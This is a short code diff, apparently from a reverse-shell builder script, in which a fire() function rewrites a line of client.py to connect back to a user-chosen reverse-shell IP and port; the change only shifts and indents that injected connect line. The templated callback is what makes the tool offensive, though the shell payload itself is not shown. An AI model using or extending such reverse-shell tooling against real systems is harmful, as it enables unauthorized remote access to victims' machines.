@@ -45,7 +45,7 @@ def aim():
 def fire():
     with open('client.py', 'r') as file:
         data = file.readlines()
-    data[22] = f's.connect(("{reverse_ip}", {reverse_port}))\n'
+    data[25] = f'    s.connect(("{reverse_ip}", {reverse_port}))\n'
     #editing the source code...for specified reverse_shell IP and PORT
     with open('client.py', 'w') as file:
         file.writelines( data )
@@ -85,3 +85,4 @@ def main():
 
 #Finally Caling the main Function To Run the Program
 main()
+
